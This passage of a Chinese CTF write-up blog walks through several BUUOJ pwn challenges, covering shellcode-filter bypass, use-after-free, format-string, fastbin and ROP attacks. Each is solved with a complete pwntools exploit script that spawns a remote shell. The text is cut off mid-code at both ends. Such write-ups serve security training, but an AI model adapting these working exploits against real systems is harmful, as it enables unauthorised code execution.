<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29398</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a071N00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/07/21/d29cTDx1rhUHFCP.png" alt="image.png"></p>
<h2 id="0x06F-starctf-2019-babyshell-shellcode-trick"><a href="#0x06F-starctf-2019-babyshell-shellcode-trick" class="headerlink" title="0x06F.starctf_2019_babyshell - shellcode trick"></a>0x06F.starctf_2019_babyshell - shellcode trick</h2><p>也是输 shellcode，不同的是会过滤这些字符：</p>
<p><img src="https://i.loli.net/2021/07/21/VXt4s8eWMTjJcCH.png" alt="image.png"></p>
<p>先考虑从栈上找有用的数据以及系统调用，简单整点基础 shellcode 我们可以看到我们无法使用 <code>pop rsi</code> 指令，但是可以控制 rdi 和 rdx，并进行系统调用</p>
<p><img src="https://i.loli.net/2021/07/21/PxNHB7XLtrzGT9D.png" alt="image.png"></p>
<h3 id="解法一：二次-shellcode-执行"><a href="#解法一：二次-shellcode-执行" class="headerlink" title="解法一：二次 shellcode 执行"></a>解法一：二次 shellcode 执行</h3><p>简单调试可以发现执行 shellcode 时 rsi 指向 shellcode，那么我们可以考虑在执行 shellcode 时执行 read 系统调用将 get shell 的 shellcode 读入，前方用 nop 填充即可</p>
<p><img src="https://i.loli.net/2021/07/21/owIAR1pz9SHMDtB.png" alt="image.png"></p>
<p>懒得在本地调和远程相同的栈环境了，直接爆，栈上第一个值非0给rdx，第六个值为0给rdi，然后就是愉快的拿shell的过程</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26442</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;plz:\n&#x27;</span>)</span><br><span class="line">p.sendline(asm(<span class="string">&#x27;pop rdx;&#x27;</span> + <span class="string">&#x27;pop rdi;&#x27;</span> * <span class="number">5</span> + <span class="string">&#x27;syscall&#x27;</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(asm(<span class="string">&#x27;nop&#x27;</span>) * <span class="number">0x20</span> + asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/07/21/NGf9JSMrKLD3UcB.png" alt="image.png"></p>
<h3 id="解法二：-x00-shellcode-绕过检测"><a href="#解法二：-x00-shellcode-绕过检测" class="headerlink" title="解法二：\x00 shellcode 绕过检测"></a>解法二：\x00 shellcode 绕过检测</h3><p>检测函数用一个大的 while 循环遍历我们输入的 shellcode，我们不难想到的是若我们的 shellcode 第一条指令以 <code>\x00</code> 开头，则可以直接绕过检测</p>
<p><img src="https://i.loli.net/2021/07/21/ezFcMAhwpnGTfYx.png" alt="image.png"></p>
<p>查阅 intel 手册后选一条合适的指令填充在开头即可</p>
<p>exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26442</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;plz:\n&#x27;</span>)</span><br><span class="line">p.sendline(asm(<span class="string">&#x27;add ah, al&#x27;</span>) + asm(shellcraft.sh()))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/07/21/4XrkSatjTRGyx6N.png" alt="image.png"></p>
<h2 id="0x070-actf-2019-babyheap-Use-After-Free-heap-arrangement"><a href="#0x070-actf-2019-babyheap-Use-After-Free-heap-arrangement" class="headerlink" title="0x070.actf_2019_babyheap - Use After Free + heap arrangement"></a>0x070.actf_2019_babyheap - Use After Free + heap arrangement</h2><p>惯例的 <code>checksec</code>，PIE 以外都开了</p>
<p><img src="https://i.loli.net/2021/07/21/Tys9a4UQuim2Jcx.png" alt="image.png"></p>
<p>拖入 IDA 进行分析，大概是有着分配、释放、打印堆块的功能，其中结构体还是套了函数指针的套娃</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">char</span> * content;</span><br><span class="line">	<span class="type">void</span> (* print_func)(<span class="type">char</span>*);</span><br><span class="line">&#125;chunk;</span><br></pre></td></tr></table></figure>

<p>裸的 UAF</p>
<p><img src="https://i.loli.net/2021/07/21/2LygVDJHk9U7lvR.png" alt="image.png"></p>
<p>老的 libc 2.27，程序里有 system 也有 <code>&quot;sh&quot;</code> 字符串，堆风水一下即可</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./ACTF_2019_babyheap&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29464</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.27.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Your choice: &quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input content:&quot;</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input list index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Please input list index:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x10</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x20</span>, <span class="string">b&#x27;arttnba3&#x27;</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(e.search(<span class="string">b&#x27;sh\x00&#x27;</span>).__next__()) + p64(e.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/07/21/ipNubZUfn42SC95.png" alt="image.png"></p>
<h1 id="0x071-0x080"><a href="#0x071-0x080" class="headerlink" title="0x071 ~ 0x080"></a>0x071 ~ 0x080</h1><h2 id="0x071-xman-2019-format-fmtstr"><a href="#0x071-xman-2019-format-fmtstr" class="headerlink" title="0x071.xman_2019_format - fmtstr"></a>0x071.xman_2019_format - fmtstr</h2><p>惯例的 <code>checksec</code>，只开了 NX 保护</p>
<p><img src="https://i.loli.net/2021/07/21/atnvVyh8sEdqlF2.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>允许读入0x37字节到堆上</p>
<p><img src="https://i.loli.net/2021/07/21/Cc1KfVQRgh5O4kY.png" alt="image.png"></p>
<p>然后就是裸的格式字符串，<strong>但是只能够读入一次</strong></p>
<p><img src="https://i.loli.net/2021/07/21/sIY5KhPl6LkmcTy.png" alt="image.png"></p>
<p>有个后门函数</p>
<p><img src="https://i.loli.net/2021/07/21/okmiRV2Gcws9yIb.png"></p>
<p>由于我们的格式化字符串在堆上，故我们不能够像以前在栈上那样直接在格式化字符串内写入地址后进行任意地址写，而是<strong>需要找栈上的有用的地址进行有限地址写</strong></p>
<p>在 <code>0x80485F6</code> 处下断点，栈布局如下：</p>
<p><img src="https://i.loli.net/2021/08/25/PuyWYB4H9MQhmqT.png" alt="image.png"></p>
<p>我们不难发现 ebp 总会指向栈上一个特定地址，而其中存放着一个栈上地址，由此我们不难想到的是<strong>可以通过两次任意地址写，第一次先通过 ebp 将栈上指针指向函数返回地址，第二次则通过该二级指针改写函数返回地址为后门函数地址</strong></p>
<p>由于栈地址是会变的，因此我们需要爆破 <code>1/16</code> 的几率</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./xman_2019_format&#x27;</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    log.info(<span class="string">&quot;try no.&quot;</span> + <span class="built_in">str</span>(count) + <span class="string">&quot; time(s)&quot;</span>)</span><br><span class="line">    p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27113</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p.recv()</span><br><span class="line">        p.sendline(<span class="string">&quot;%&quot;</span> + <span class="built_in">str</span>((count % <span class="number">16</span>) * <span class="number">16</span> + <span class="number">0xc</span>) + <span class="string">&quot;c%10$hhn&quot;</span> + <span class="string">&quot;|%&quot;</span> + <span class="built_in">str</span>(<span class="number">0x85AB</span>) + <span class="string">&quot;c%18$hnarttnba3&quot;</span>)</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;arttnba3&quot;</span>)</span><br><span class="line">        p.sendline(<span class="string">b&quot;cat flag&quot;</span>)</span><br><span class="line">        p.recvline_contains(<span class="string">&#x27;flag&#x27;</span>, timeout=<span class="number">1</span>)</span><br><span class="line">        p.interactive()</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        p.close()</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即得 flag（运气还挺好）</p>
<p><img src="https://i.loli.net/2021/08/25/GfLUreJWTvsyuji.png" alt="image.png"></p>
<h2 id="0x072-wustctf2020-easyfast-Use-After-Free-Fastbin-Attack"><a href="#0x072-wustctf2020-easyfast-Use-After-Free-Fastbin-Attack" class="headerlink" title="0x072.wustctf2020_easyfast - Use After Free + Fastbin Attack"></a>0x072.wustctf2020_easyfast - Use After Free + Fastbin Attack</h2><p>惯例的 <code>checksec</code> ，只开了 NX 和 canary</p>
<p><img src="https://i.loli.net/2021/08/25/cKoaG1XHxhZvUV8.png" alt="image.png"></p>
<p>拖入 IDA 进行分析，常规的菜单堆</p>
<p><img src="https://i.loli.net/2021/08/25/gJY7h9oVlcZi1Ok.png" alt="image.png"></p>
<p>有个裸的 UAF</p>
<p><img src="https://i.loli.net/2021/08/25/BOmfjRE4UkLsGTQ.png" alt="image.png"></p>
<p>有个后门</p>
<p><img src="https://i.loli.net/2021/08/25/KCUyR8DIcS42wdJ.png" alt="image.png"></p>
<p>这个位置刚好有一个 0x50 的 header</p>
<p><img src="https://i.loli.net/2021/08/25/uLsN82WZQP7dDhb.png" alt="image.png"></p>
<p>故 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./wustctf2020_easyfast&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27337</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;choice&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new</span>(<span class="params">size:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index:<span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index:<span class="built_in">int</span>, content</span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;index&gt;&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    new(<span class="number">0x40</span>)</span><br><span class="line">    new(<span class="number">0x40</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>, p64(<span class="number">0x602080</span>))</span><br><span class="line">    new(<span class="number">0x40</span>)</span><br><span class="line">    new(<span class="number">0x40</span>)</span><br><span class="line">    edit(<span class="number">3</span>, p64(<span class="number">0</span>))</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>运行即可 get shell</p>
<p><img src="https://i.loli.net/2021/08/25/XutRe9gfc5HMNjb.png" alt="image.png"></p>
<h2 id="0x073-强网杯2019-拟态-STKOF-ret2text"><a href="#0x073-强网杯2019-拟态-STKOF-ret2text" class="headerlink" title="0x073.强网杯2019 拟态 STKOF - ret2text"></a>0x073.强网杯2019 拟态 STKOF - ret2text</h2><p>给了两个二进制文件，得一个 exp 同时打通两个才行</p>
<p>惯例的 <code>checksec</code>，只开了 NX 和 canary</p>
<p><img src="https://i.loli.net/2021/08/25/wT3lY5pIHXaQmuk.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>都是栈溢出，但是到 bp 寄存器的距离不同，可以利用这个差距布置恰当的 payload</p>
<p><img src="https://i.loli.net/2021/08/25/vW9T6FA1J7SIBXV.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/08/25/buUMfcPQ5Eiepol.png" alt="image.png"></p>
<p>静态编译的程序有很多可用的 gadget，对于 32 位而言，可以寻找一个合适的 <code>sub esp</code> 或者 <code>add esp</code> 的 gadget 将 payload 与 64 位错开，64位正常布置 payload 即可</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary ./pwn --ropchain | grep <span class="string">&#x27;add esp&#x27;</span></span></span><br><span class="line">...</span><br><span class="line">0x08092c75 : add esp, 0x70 ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure>

<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#context.arch = &#x27;amd64&#x27;</span></span><br><span class="line">e1 = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">e2 = ELF(<span class="string">&#x27;./pwn2&#x27;</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x4005f6</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x405895</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x43b9d5</span></span><br><span class="line">pop_rax_ret = <span class="number">0x43b97c</span></span><br><span class="line">pop_rdx_pop_rsi_ret = <span class="number">0x43d9f9</span></span><br><span class="line">pop_ebx_pop_esi_pop_edi_ret = <span class="number">0x08049b19</span></span><br><span class="line">pop_edx_pop_ecx_pop_ebx_ret = <span class="number">0x0806e9f1</span></span><br><span class="line">pop_eax_ret = <span class="number">0x080a8af6</span></span><br><span class="line">syscall = <span class="number">0x4011dc</span></span><br><span class="line">int_0x80 = <span class="number">0x080495a3</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x10C</span> + p32(<span class="number">0xdeadbeef</span>) + p32(<span class="number">0x08092c75</span>) + p32(<span class="number">0xdeadbeef</span>) </span><br><span class="line">payload64 = p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(e2.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p64(e2.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload64 += p64(pop_rdi_ret) + p64(e2.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p64(pop_rdx_pop_rsi_ret) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(pop_rax_ret) + p64(<span class="number">59</span>) + p64(syscall)</span><br><span class="line">payload64 = payload64.ljust(<span class="number">0x70</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">payload32 = <span class="string">b&#x27;arttnba3&#x27;</span> + p32(e1.sym[<span class="string">&#x27;read&#x27;</span>]) + p32(pop_ebx_pop_esi_pop_edi_ret) + p32(<span class="number">0</span>) + p32(e1.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p32(<span class="number">0x100</span>)</span><br><span class="line">payload32 += p32(pop_eax_ret) + p32(<span class="number">11</span>) + p32(pop_edx_pop_ecx_pop_ebx_ret) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(e1.sym[<span class="string">&#x27;__free_hook&#x27;</span>]) + p32(int_0x80)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29732</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload + payload64 + payload32)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>运行即可 get shell（居然是 root）</p>
<p><img src="https://i.loli.net/2021/08/25/aMUpTQZsOLrEci4.png" alt="image.png"></p>
<h2 id="0x074-hitcon-2018-children-tcache-off-by-null"><a href="#0x074-hitcon-2018-children-tcache-off-by-null" class="headerlink" title="0x074.hitcon_2018_children_tcache - off by null"></a>0x074.hitcon_2018_children_tcache - off by null</h2><h2 id="0x075-roarctf-2019-realloc-magic"><a href="#0x075-roarctf-2019-realloc-magic" class="headerlink" title="0x075.roarctf_2019_realloc_magic"></a>0x075.roarctf_2019_realloc_magic</h2><h1 id="0x-0x"><a href="#0x-0x" class="headerlink" title="0x??? ~ 0x???"></a>0x??? ~ 0x???</h1><h2 id="0x-houseoforange-hitcon-2016-House-of-Orange"><a href="#0x-houseoforange-hitcon-2016-House-of-Orange" class="headerlink" title="0x???.houseoforange_hitcon_2016 - House of Orange"></a>0x???.houseoforange_hitcon_2016 - House of Orange</h2><p>想都不用想肯定事保护全开</p>
<p><img src="https://i.loli.net/2021/05/10/aQHisnOz1tXlCMY.png" alt="image.png"></p>
<p>拖入 IDA 进行分析，大概有着分配、打印、编辑堆块的功能，<strong>没有释放的功能</strong></p>
<p>只能分配三次</p>
<p><img src="https://i.loli.net/2021/05/10/6KJBQ7vXUPLcF3C.png" alt="image.png"></p>
<p>漏洞点在于编辑堆块的时候验证不严密，存在堆溢出</p>
<p><img src="https://i.loli.net/2021/05/10/1YseHJxnPOZQc4K.png" alt="image.png"></p>
<p>由于没有 free() 函数，考虑通过堆溢出修改 top chunk 的 size 后再行分配触发 brk 系统调用扩展堆区将原有 top chunk 送入 unsorted bin 后再分配回来，通过 bk 指针泄露 libc 基址</p>
<p>我们都知道，在分配时若是 small bin 和 large bin 都是空的时候，ptmalloc2 会将 unsorted bin 中所有 chunk 放入 对应 bin 中，因此我们可以通过分配 large bin 以由其 fd_nextsize 指针泄露堆基址</p>
<p>随后在 unsorted bin 中伪造 _IO_file_plus 结构体，通过 House of Orange 的手法进行 FSOP 以 get shell</p>
<p>比较坑的一个点大概是本地和远程偏移好像有些小不一样……？后面懒得去算偏移了直接大面积撞就完事了</p>
<p>exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">p_name = <span class="string">&#x27;./houseoforange_hitcon_2016&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27323</span>)<span class="comment">#process(p_name)#</span></span><br><span class="line">e = ELF(p_name)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/arttnba3/Desktop/CTF/libc/64bit/libc-2.23.so&#x27;</span>)<span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command:<span class="built_in">int</span></span>):</span><br><span class="line">    